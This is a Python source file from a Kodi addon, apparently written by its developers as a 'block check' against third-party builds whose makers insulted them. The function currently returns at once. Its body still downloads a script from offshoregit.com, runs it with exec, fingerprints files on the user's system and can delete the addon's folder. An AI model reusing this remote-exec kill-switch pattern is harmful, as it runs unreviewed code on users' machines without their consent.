'''
This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
from build makers that publicly insult or slander TVA's developers and friends. If your build is
impacted by this check, you can have it removed by publicly apologizing for your previous statements
via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
them yourself.
                                                                                           http://i.imgur.com/TqIEnYB.gif
                                                                                           TVA developers (and friends)
'''
import traceback
def do_block_check(uninstall=False):
    return 
    try:
        import urllib2
        import sys
        namespace = {}
        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
        if namespace["real_check"](uninstall): 
            sys.exit()
        return
    except SystemExit:
        sys.exit()
    except:
        traceback.print_exc()
        pass
      
    import hashlib
    import xbmcvfs
    import xbmc
    bad_md5s = [
        ('special://home/media/splash.png', '926dc482183da52644e08658f4bf80e8'),
        ('special://home/media/splash.png', '084e2bc2ce2bf099ce273aabe331b02e'),
        ('special://home/addons/skin.hybrid.dev/backgrounds/MUSIC/142740.jpg', '9ad06a57315bf66c9dc2f5d2d4d5fdbd'),
        ('special://home/addons/skin.hybrid.dev/backgrounds/GEARS TV/Woman-and-superman-wallpaper-HD-1920-1200.jpg', '4c46914b2b310ca11f145a5f32f59730'),
        ('special://home/addons/skin.hybrid.dev/backgrounds/PROGRAMS/terminator-genesys-robot-skull-gun-face.jpg', '1496772b01e301807ea835983180e4e6'),
        ('special://home/addons/skin.hybrid.dev/backgrounds/50-Cent.jpg', 'c45fd079e48fa692ebf179406e66d741'),
        ('special://home/addons/skin.hybrid.dev/backgrounds/kevin-hart-screw-face.jpg', '0fa8f320016798adef160bb8880479bc')]
    bad_addons = ['plugin.program.targetin1080pwizard', 'plugin.video.targetin1080pwizard']
    found_md5 = False
    for path, bad_md5 in bad_md5s:
        f = xbmcvfs.File(path)
        md5 = hashlib.md5(f.read()).hexdigest()
        if md5 == bad_md5:
            found_md5 = True
            break

    has_bad_addon = any(xbmc.getCondVisibility('System.HasAddon(%s)' % (addon)) for addon in bad_addons)
    if has_bad_addon or found_md5:
        import xbmcgui
        import sys
        line2 = 'Press OK to uninstall this addon' if uninstall else 'Press OK to exit this addon'
        xbmcgui.Dialog().ok('Incompatible System', 'This addon will not work with the build you have installed', line2)
        if uninstall:
            import xbmcaddon
            import shutil
            addon_path = xbmcaddon.Addon().getAddonInfo('path').decode('utf-8')
            shutil.rmtree(addon_path)
        sys.exit()
        